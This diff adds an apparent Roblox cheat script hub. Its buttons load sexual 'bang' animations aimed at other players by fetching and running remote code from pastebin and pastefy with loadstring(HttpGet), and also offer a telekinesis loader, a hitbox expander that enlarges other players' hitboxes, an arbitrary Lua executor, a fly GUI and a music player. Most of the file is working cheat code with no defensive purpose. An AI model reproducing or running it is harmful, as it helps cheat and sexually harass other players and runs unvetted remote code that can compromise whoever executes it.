+        OffButton.Visible = true
+    end
+end)
+
+-- Yeni karakter oluşturulduğunda işlevi yeniden kur
+LocalPlayer.CharacterAdded:Connect(function(newCharacter)
+    Character = newCharacter
+    setupCharacter(newCharacter)
+end)
+
+-- İlk karakteri ayarla
+setupCharacter(Character)
+
+end)
+
+MainSection:NewButton("Bang gui-F*ck people(SUS)😳", "ButtonInfo", function()
+-- Feel free to modify, contact pystyt on discord if u want to show me the modifications you did to the script, thanks alot
+-- Detect R6 or R15
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local isR6 = character:FindFirstChild("Torso") ~= nil
+
+-- Notification Function
+local function showNotification(message)
+    local notificationGui = Instance.new("ScreenGui")
+    notificationGui.Name = "NotificationGui"
+    notificationGui.Parent = game.CoreGui
+
+    local notificationFrame = Instance.new("Frame")
+    notificationFrame.Size = UDim2.new(0, 300, 0, 50)
+    notificationFrame.Position = UDim2.new(0.5, -150, 1, -60)
+    notificationFrame.AnchorPoint = Vector2.new(0.5, 1)
+    notificationFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    notificationFrame.BorderSizePixel = 0
+    notificationFrame.Parent = notificationGui
+
+    local uicorner = Instance.new("UICorner")
+    uicorner.CornerRadius = UDim.new(0, 10)
+    uicorner.Parent = notificationFrame
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Size = UDim2.new(1, -20, 1, 0)
+    textLabel.Position = UDim2.new(0, 10, 0, 0)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Text = message .. " | by pyst"
+    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    textLabel.Font = Enum.Font.SourceSansSemibold
+    textLabel.TextSize = 18
+    textLabel.TextXAlignment = Enum.TextXAlignment.Left
+    textLabel.Parent = notificationFrame
+
+    notificationFrame.BackgroundTransparency = 1
+    textLabel.TextTransparency = 1
+
+    game:GetService("TweenService"):Create(
+        notificationFrame,
+        TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
+        {BackgroundTransparency = 0}
+    ):Play()
+
+    game:GetService("TweenService"):Create(
+        textLabel,
+        TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
+        {TextTransparency = 0}
+    ):Play()
+
+    task.delay(5, function()
+        game:GetService("TweenService"):Create(
+            notificationFrame,
+            TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
+            {BackgroundTransparency = 1}
+        ):Play()
+
+        game:GetService("TweenService"):Create(
+            textLabel,
+            TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
+            {TextTransparency = 1}
+        ):Play()
+
+        task.delay(0.5, function()
+            notificationGui:Destroy()
+        end)
+    end)
+end
+
+-- Show notification based on rig type
+if isR6 then
+    showNotification("R6 detected")
+else
+    showNotification("R15 detected")
+end
+
+-- Create Screen GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "BangGui"
+gui.Parent = game.CoreGui
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 300, 0, 300)
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = gui
+
+local uicorner = Instance.new("UICorner")
+uicorner.CornerRadius = UDim.new(0, 20)
+uicorner.Parent = mainFrame
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -60, 0, 30)
+title.Position = UDim2.new(0, 10, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "Choose"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.SourceSansSemibold
+title.TextSize = 24
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = mainFrame
+
+-- Close Button
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 30, 0, 30)
+closeButton.Position = UDim2.new(1, -40, 0, 0)
+closeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+closeButton.Text = "X"
+closeButton.Font = Enum.Font.SourceSansBold
+closeButton.TextSize = 20
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.Parent = mainFrame
+
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(0, 10)
+closeCorner.Parent = closeButton
+
+closeButton.MouseButton1Click:Connect(function()
+    gui:Destroy()
+end)
+
+-- Minimize Button
+local minimizeButton = Instance.new("TextButton")
+minimizeButton.Size = UDim2.new(0, 30, 0, 30)
+minimizeButton.Position = UDim2.new(1, -80, 0, 0)
+minimizeButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+minimizeButton.Text = "-"
+minimizeButton.Font = Enum.Font.SourceSansBold
+minimizeButton.TextSize = 20
+minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+minimizeButton.Parent = mainFrame
+
+local minimizeCorner = Instance.new("UICorner")
+minimizeCorner.CornerRadius = UDim.new(0, 10)
+minimizeCorner.Parent = minimizeButton
+
+local minimized = false
+minimizeButton.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    if minimized then
+        mainFrame:TweenSize(UDim2.new(0, 300, 0, 30), Enum.EasingDirection.In, Enum.EasingStyle.Quint, 0.5)
+    else
+        mainFrame:TweenSize(UDim2.new(0, 300, 0, 300), Enum.EasingDirection.Out, Enum.EasingStyle.Quint, 0.5)
+    end
+end)
+
+-- Dragging Functionality
+local dragging, dragStart, startPos
+mainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+    end
+end)
+
+mainFrame.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+mainFrame.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
+
+-- Scrolling Frame
+local scrollingFrame = Instance.new("ScrollingFrame")
+scrollingFrame.Size = UDim2.new(1, -20, 1, -50)
+scrollingFrame.Position = UDim2.new(0, 10, 0, 40)
+scrollingFrame.BackgroundTransparency = 1
+scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 300)
+scrollingFrame.ScrollBarThickness = 6
+scrollingFrame.Parent = mainFrame
+
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0, 10)
+layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+layout.Parent = scrollingFrame
+
+-- Buttons Data
+local buttons = {
+    {name = "Bang V2", r6 = "https://pastebin.com/raw/aPSHMV6K", r15 = "https://pastebin.com/raw/1ePMTt9n"},
+    {name = "Get Banged", r6 = "https://pastebin.com/raw/zHbw7ND1", r15 = "https://pastebin.com/raw/7hvcjDnW"},
+    {name = "Suck", r6 = "https://pastebin.com/raw/SymCfnAW", r15 = "https://pastebin.com/raw/p8yxRfr4"},
+    {name = "Get Suc", r6 = "https://pastebin.com/raw/FPu4e2Qh", r15 = "https://pastebin.com/raw/DyPP2tAF"},
+    {name = "Jerk", r6 = "https://pastefy.app/wa3v2Vgm/raw", r15 = "https://pastefy.app/YZoglOyJ/raw"}
+}
+
+for _, buttonData in pairs(buttons) do
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0.8, 0, 0, 40)
+    button.BackgroundColor3 = Color3.fromRGB(50, 150, 255)
+    button.Text = buttonData.name
+    button.Font = Enum.Font.SourceSansBold
+    button.TextSize = 20
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.Parent = scrollingFrame
+
+    local uicorner = Instance.new("UICorner")
+    uicorner.CornerRadius = UDim.new(0, 10)
+    uicorner.Parent = button
+
+    button.MouseButton1Click:Connect(function()
+        if isR6 then
+            loadstring(game:HttpGet(buttonData.r6))()
+        else
+            loadstring(game:HttpGet(buttonData.r15))()
+        end
+    end)
+end
+end)
+
+MainSection:NewButton("Music Player (LocalScript)", "ButtonInfo", function()
+-- Services
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local SoundService = game:GetService("SoundService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Function to play sound by ID
+local function playSound(soundId, songName, showNotification)
+    -- Stop any currently playing sound before playing the new one
+    if currentSound then
+        currentSound:Stop()
+    end
+
+    local sound = Instance.new("Sound")
+    sound.SoundId = "rbxassetid://" .. soundId
+    sound.Parent = SoundService
+    sound.Volume = 1  -- Maximum volume
+    sound:Play()
+
+    -- Store current sound to stop it later
+    currentSound = sound
+
+    sound.Ended:Connect(function()
+        sound:Destroy()
+        currentSound = nil -- Clear the reference when the sound ends
+    end)
+
+    -- Show notification with song name and ":D" if showNotification is true
+    if showNotification then
+        local success, userId = pcall(function()
+            return Players:GetUserIdFromNameAsync("bok31_31mal")
+        end)
+
+        if success then
+            local thumbType = Enum.ThumbnailType.HeadShot
+            local thumbSize = Enum.ThumbnailSize.Size420x420
+            local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+
+            StarterGui:SetCore("SendNotification", {
+                Title = "Enjoy " .. songName .. " :D",  -- Dynamic title with song name and ":D"
+                Text = "By bok31_31mal",
+                Icon = content,
+                Button1 = "Ok",
+                Duration = 5
+            })
+        else
+            warn("Failed to get user ID for bok31_31mal")
+        end
+    end
+end
+
+-- GUI Creation
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "MusicPlayerGUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 400, 0, 400)  -- Boyutu küçültüldü
+MainFrame.Position = UDim2.new(0.5, -200, 0.5, -200)  -- Alt kısımdan biraz daha yukarı kaydırıldı
+MainFrame.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+-- Make the GUI round
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 20)
+UICorner.Parent = MainFrame
+
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.Text = "Music Player"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Title.Font = Enum.Font.SourceSans
+Title.TextSize = 20
+Title.Parent = MainFrame
+
+-- Minimize Button
+local MinimizeButton = Instance.new("TextButton")
+MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
+MinimizeButton.Position = UDim2.new(1, -35, 0, 5)
+MinimizeButton.Text = "-"
+MinimizeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeButton.Font = Enum.Font.SourceSans
+MinimizeButton.TextSize = 18
+MinimizeButton.Parent = MainFrame
+
+-- Close Button (X)
+local CloseButton = Instance.new("TextButton")
+CloseButton.Size = UDim2.new(0, 30, 0, 30)
+CloseButton.Position = UDim2.new(1, -70, 0, 5)
+CloseButton.Text = "X"
+CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.Font = Enum.Font.SourceSans
+CloseButton.TextSize = 18
+CloseButton.Parent = MainFrame
+
+-- Music Buttons
+local MusicButtons = {}
+local yPosition = 0.1 -- Start position for the first button (fixed extra space issue)
+
+local function createMusicButton(name, soundId)
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(1, 0, 0, 40)  -- Yükseklik sabitlendi
+    button.Position = UDim2.new(0, 0, yPosition, 40)
+    button.Text = name
+    button.BackgroundColor3 = Color3.fromRGB(0, 128, 0)
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.Font = Enum.Font.SourceSans
+    button.TextSize = 18
+    button.Parent = MainFrame
+
+    button.MouseButton1Click:Connect(function()
+        -- Play sound when button is clicked
+        playSound(soundId, name, true)
+    end)
+
+    table.insert(MusicButtons, button) -- Add button to the list
+    yPosition = yPosition + 0.1 -- Add 0.1 offset for the next button (approx. 0.5 cm)
+end
+
+-- Adding Music Buttons with updated music IDs
+createMusicButton("Raining Tacos", "142376088")
+createMusicButton("Relaxed Scene", "1848354536")
+createMusicButton("Life in an Elevator", "1841647093")
+createMusicButton("Diamonds", "1846575559")
+
+-- Stop Music Button (Plays the specified ID when clicked)
+local StopButton = Instance.new("TextButton")
+StopButton.Size = UDim2.new(1, 0, 0, 40)
+StopButton.Position = UDim2.new(0, 0, yPosition, 40)
+StopButton.Text = "Stop Music"
+StopButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+StopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+StopButton.Font = Enum.Font.SourceSans
+StopButton.TextSize = 18
+StopButton.Parent = MainFrame
+
+-- Store current sound for stopping it
+local currentSound = nil
+
+StopButton.MouseButton1Click:Connect(function()
+    -- Stop the current music and play the "Stop Music" sound
+    if currentSound then
+        currentSound:Stop()
+        currentSound = nil
+    end
+    
+    -- Play the "Stop Music" sound
+    playSound("297245108", "Stop Music Sound", false)
+end)
+
+-- Minimize/Close functionality
+local minimized = false
+MinimizeButton.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    if minimized then
+        -- Hide all buttons
+        MainFrame:TweenSize(UDim2.new(0, 400, 0, 40), "Out", "Quad", 0.3, true)
+        MinimizeButton.Text = "+"
+        for _, button in pairs(MusicButtons) do
+            button.Visible = false
+        end
+        StopButton.Visible = false
+    else
+        -- Show all buttons
+        MainFrame:TweenSize(UDim2.new(0, 400, 0, 400), "Out", "Quad", 0.3, true)
+        MinimizeButton.Text = "-"
+        for _, button in pairs(MusicButtons) do
+            button.Visible = true
+        end
+        StopButton.Visible = true
+    end
+end)
+
+CloseButton.MouseButton1Click:Connect(function()
+    -- Play the sound first, then destroy GUI after 1 second
+    playSound("557057898", "Special Sound", false)
+    wait(1)  -- Wait for 1 second
+    ScreenGui:Destroy()  -- Destroy the GUI
+end)
+
+-- Draggable Functionality
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+MainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+MainFrame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragInput = input
+    end
+end)
+
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
+
+end)
+
+MainSection:NewButton("Hitbox", "ButtonInfo", function()
+--[[ 
+    WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk! 
+]]
+-- leave a like pls
+
+_G.HeadSize = 100
+_G.Transparency = 0.7
+_G.Disabled = true
+
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
+
+-- Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 280)
+frame.Position = UDim2.new(0.5, -150, 0.5, -140)
+frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+frame.Parent = screenGui
+
+-- Title Label
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 40)
+title.Text = "Hitbox Settings"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextSize = 20
+title.BackgroundTransparency = 1
+title.Parent = frame
+
+-- Hitbox Size Input
+local sizeLabel = Instance.new("TextLabel")
+sizeLabel.Size = UDim2.new(1, 0, 0, 30)
+sizeLabel.Position = UDim2.new(0, 0, 0.15, 0)
+sizeLabel.Text = "Hitbox Size (X, Y, Z):"
+sizeLabel.TextColor3 = Color3.new(1, 1, 1)
+sizeLabel.TextSize = 16
+sizeLabel.BackgroundTransparency = 1
+sizeLabel.Parent = frame
+
+local sizeInput = Instance.new("TextBox")
+sizeInput.Size = UDim2.new(1, 0, 0, 30)
+sizeInput.Position = UDim2.new(0, 0, 0.25, 0)
+sizeInput.Text = "100"
+sizeInput.TextColor3 = Color3.new(1, 1, 1)
+sizeInput.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+sizeInput.TextSize = 16
+sizeInput.ClearTextOnFocus = false
+sizeInput.Parent = frame
+
+-- Hitbox Transparency Input
+local transparencyLabel = Instance.new("TextLabel")
+transparencyLabel.Size = UDim2.new(1, 0, 0, 30)
+transparencyLabel.Position = UDim2.new(0, 0, 0.45, 0)
+transparencyLabel.Text = "Hitbox Transparency (0 - 1):"
+transparencyLabel.TextColor3 = Color3.new(1, 1, 1)
+transparencyLabel.TextSize = 16
+transparencyLabel.BackgroundTransparency = 1
+transparencyLabel.Parent = frame
+
+local transparencyInput = Instance.new("TextBox")
+transparencyInput.Size = UDim2.new(1, 0, 0, 30)
+transparencyInput.Position = UDim2.new(0, 0, 0.55, 0)
+transparencyInput.Text = "0.7"
+transparencyInput.TextColor3 = Color3.new(1, 1, 1)
+transparencyInput.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+transparencyInput.TextSize = 16
+transparencyInput.ClearTextOnFocus = false
+transparencyInput.Parent = frame
+
+-- OK Button
+local okButton = Instance.new("TextButton")
+okButton.Size = UDim2.new(0, 100, 0, 30)
+okButton.Position = UDim2.new(0.5, -50, 0.75, 0)
+okButton.Text = "OK"
+okButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+okButton.TextColor3 = Color3.new(1, 1, 1)
+okButton.Parent = frame
+
+-- Close Hitbox Button
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 100, 0, 30)
+closeButton.Position = UDim2.new(0.5, -50, 0.85, 0)
+closeButton.Text = "Close Hitbox"
+closeButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
+closeButton.TextColor3 = Color3.new(1, 1, 1)
+closeButton.Parent = frame
+
+-- X Button (Close GUI)
+local xButton = Instance.new("TextButton")
+xButton.Size = UDim2.new(0, 30, 0, 30)
+xButton.Position = UDim2.new(1, -30, 0, 0)
+xButton.Text = "X"
+xButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+xButton.TextColor3 = Color3.new(1, 1, 1)
+xButton.Parent = frame
+
+-- Apply Hitbox Settings
+okButton.MouseButton1Click:Connect(function()
+    -- Update Hitbox Size
+    local sizeValue = tonumber(sizeInput.Text)
+    if sizeValue and sizeValue > 0 then
+        _G.HeadSize = sizeValue
+    end
+
+    -- Update Hitbox Transparency
+    local transparencyValue = tonumber(transparencyInput.Text)
+    if transparencyValue and transparencyValue >= 0 and transparencyValue <= 1 then
+        _G.Transparency = transparencyValue
+    end
+end)
+
+-- Close Hitbox Function (sets Transparency to 1)
+closeButton.MouseButton1Click:Connect(function()
+    _G.Transparency = 1  -- Set transparency to 1 (fully visible) when closing
+end)
+
+-- Close GUI on X Button click
+xButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
+
+-- Apply Hitbox to Players
+game:GetService('RunService').RenderStepped:Connect(function()
+    if not _G.Disabled then
+        for _, player in next, game:GetService('Players'):GetPlayers() do
+            if player.Name ~= game:GetService('Players').LocalPlayer.Name then
+                pcall(function()
+                    local character = player.Character
+                    if character and character:FindFirstChild("HumanoidRootPart") then
+                        local humanoidRootPart = character.HumanoidRootPart
+                        humanoidRootPart.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
+                        humanoidRootPart.Transparency = _G.Transparency
+                        humanoidRootPart.BrickColor = BrickColor.new("Really blue")
+                        humanoidRootPart.Material = Enum.Material.Neon
+                        humanoidRootPart.CanCollide = false
+                    end
+                end)
+            end
+        end
+    end
+end)
+
+-- Make GUI Draggable
+local dragging = false
+local dragStart = nil
+local startPos = nil
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+frame.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = false
+    end
+end)
+
+end)
+
+MainSection:NewButton("Telekinesis By Baris!", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastefy.app/XKyd8NKb/raw"))()
+end)
+
+
+MainSection:NewButton("Lua Executor!", "ButtonInfo", function()
+-- Roblox Lua Script Executor (Resizable GUI)
+
+-- Create GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 350, 0, 300) -- Adjusted size
+Frame.Position = UDim2.new(0.5, -175, 0.5, -150)
+Frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+Frame.Active = true
+Frame.Draggable = true -- Enabling drag for entire frame
+Frame.Parent = ScreenGui
+
+local DragBar = Instance.new("Frame")
+DragBar.Size = UDim2.new(1, 0, 0, 30)
+DragBar.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+DragBar.Parent = Frame
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 1, 0)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.Text = "Lua Executor"
+Title.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.SourceSansBold
+Title.TextSize = 18
+Title.Parent = DragBar
+
+local CloseButton = Instance.new("TextButton")
+CloseButton.Size = UDim2.new(0, 25, 0, 25)
+CloseButton.Position = UDim2.new(1, -30, 0, 5)
+CloseButton.Text = "X"
+CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.Font = Enum.Font.SourceSansBold
+CloseButton.TextSize = 14
+CloseButton.Parent = DragBar
+CloseButton.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+local MinimizeButton = Instance.new("TextButton")
+MinimizeButton.Size = UDim2.new(0, 25, 0, 25)
+MinimizeButton.Position = UDim2.new(1, -60, 0, 5)
+MinimizeButton.Text = "-"
+MinimizeButton.BackgroundColor3 = Color3.fromRGB(200, 200, 50)
+MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeButton.Font = Enum.Font.SourceSansBold
+MinimizeButton.TextSize = 14
+MinimizeButton.Parent = DragBar
+
+local isMinimized = false
+local previousSize = Frame.Size
+MinimizeButton.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+    if isMinimized then
+        previousSize = Frame.Size
+        Frame.Size = UDim2.new(0, 350, 0, 30)
+    else
+        Frame.Size = previousSize
+    end
+    for _, child in ipairs(Frame:GetChildren()) do
+        if child ~= DragBar then
+            child.Visible = not isMinimized
+        end
+    end
+end)
+
+local ScrollingFrame = Instance.new("ScrollingFrame")
+ScrollingFrame.Size = UDim2.new(0.9, 0, 0.5, 0)
+ScrollingFrame.Position = UDim2.new(0.05, 0, 0.25, 0)
+ScrollingFrame.BackgroundTransparency = 1
+ScrollingFrame.BorderSizePixel = 0
+ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 1000)
+ScrollingFrame.ScrollBarThickness = 8
+ScrollingFrame.Parent = Frame
+
+local ScriptBox = Instance.new("TextBox")
+ScriptBox.Size = UDim2.new(1, -8, 0, 1000)
+ScriptBox.Position = UDim2.new(0, 0, 0, 0)
+ScriptBox.Text = "Enter Lua code here"
+ScriptBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+ScriptBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScriptBox.Font = Enum.Font.SourceSans
+ScriptBox.TextSize = 16
+ScriptBox.ClearTextOnFocus = false -- Prevent text from clearing on focus
+ScriptBox.MultiLine = true
+ScriptBox.TextWrapped = false
+ScriptBox.TextXAlignment = Enum.TextXAlignment.Left
+ScriptBox.TextYAlignment = Enum.TextYAlignment.Top
+ScriptBox.Parent = ScrollingFrame
+
+local ExecuteButton = Instance.new("TextButton")
+ExecuteButton.Size = UDim2.new(0.9, 0, 0.15, 0)
+ExecuteButton.Position = UDim2.new(0.05, 0, 0.75, 0)
+ExecuteButton.Text = "Execute"
+ExecuteButton.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteButton.Font = Enum.Font.SourceSansBold
+ExecuteButton.TextSize = 16
+ExecuteButton.Parent = Frame
+
+local ClearButton = Instance.new("TextButton")
+ClearButton.Size = UDim2.new(0.9, 0, 0.15, 0)
+ClearButton.Position = UDim2.new(0.05, 0, 0.6, 0)
+ClearButton.Text = "Clear"
+ClearButton.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
+ClearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ClearButton.Font = Enum.Font.SourceSansBold
+ClearButton.TextSize = 16
+ClearButton.Parent = Frame
+
+-- Execute Button Functionality
+ExecuteButton.MouseButton1Click:Connect(function()
+    local code = ScriptBox.Text
+    local func, errorMessage = loadstring(code) -- Attempt to load the Lua code
+    if func then
+        local success, result = pcall(func) -- Execute the Lua code safely
+        if not success then
+            warn("Error executing code: " .. result)
+        end
+    else
+        warn("Error loading code: " .. errorMessage)
+    end
+end)
+
+-- Clear Button Functionality
+ClearButton.MouseButton1Click:Connect(function()
+    ScriptBox.Text = ""
+end)
+
+end)
+
+
+MainSection:NewButton("Fly Gui V3", "ButtonInfo", function()
+    local main = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local up = Instance.new("TextButton")
+local down = Instance.new("TextButton")
+local onof = Instance.new("TextButton")
+local TextLabel = Instance.new("TextLabel")
+local plus = Instance.new("TextButton")
+local speed = Instance.new("TextLabel")
+local mine = Instance.new("TextButton")
+local closebutton = Instance.new("TextButton")
+local mini = Instance.new("TextButton")
+local mini2 = Instance.new("TextButton")
+
+main.Name = "main"
+main.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+main.ResetOnSpawn = false
+
+Frame.Parent = main
+Frame.BackgroundColor3 = Color3.fromRGB(163, 255, 137)
+Frame.BorderColor3 = Color3.fromRGB(103, 221, 213)
+Frame.Position = UDim2.new(0.100320168, 0, 0.379746825, 0)
+Frame.Size = UDim2.new(0, 190, 0, 57)
+
+up.Name = "up"
+up.Parent = Frame
+up.BackgroundColor3 = Color3.fromRGB(79, 255, 152)
+up.Size = UDim2.new(0, 44, 0, 28)
+up.Font = Enum.Font.SourceSans
+up.Text = "UP"
+up.TextColor3 = Color3.fromRGB(0, 0, 0)
+up.TextSize = 14.000
+
+down.Name = "down"
+down.Parent = Frame
+down.BackgroundColor3 = Color3.fromRGB(215, 255, 121)
+down.Position = UDim2.new(0, 0, 0.491228074, 0)
+down.Size = UDim2.new(0, 44, 0, 28)
+down.Font = Enum.Font.SourceSans
+down.Text = "DOWN"
+down.TextColor3 = Color3.fromRGB(0, 0, 0)
+down.TextSize = 14.000
+
+onof.Name = "onof"
+onof.Parent = Frame
+onof.BackgroundColor3 = Color3.fromRGB(255, 249, 74)
+onof.Position = UDim2.new(0.702823281, 0, 0.491228074, 0)
+onof.Size = UDim2.new(0, 56, 0, 28)
+onof.Font = Enum.Font.SourceSans
+onof.Text = "fly"
+onof.TextColor3 = Color3.fromRGB(0, 0, 0)
+onof.TextSize = 14.000
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(242, 60, 255)
+TextLabel.Position = UDim2.new(0.469327301, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 100, 0, 28)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "FLY GUI V3 BY BARIS"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+plus.Name = "plus"
+plus.Parent = Frame
+plus.BackgroundColor3 = Color3.fromRGB(133, 145, 255)
+plus.Position = UDim2.new(0.231578946, 0, 0, 0)
+plus.Size = UDim2.new(0, 45, 0, 28)
+plus.Font = Enum.Font.SourceSans
+plus.Text = "+"
+plus.TextColor3 = Color3.fromRGB(0, 0, 0)
+plus.TextScaled = true
+plus.TextSize = 14.000
+plus.TextWrapped = true
+
+speed.Name = "speed"
+speed.Parent = Frame
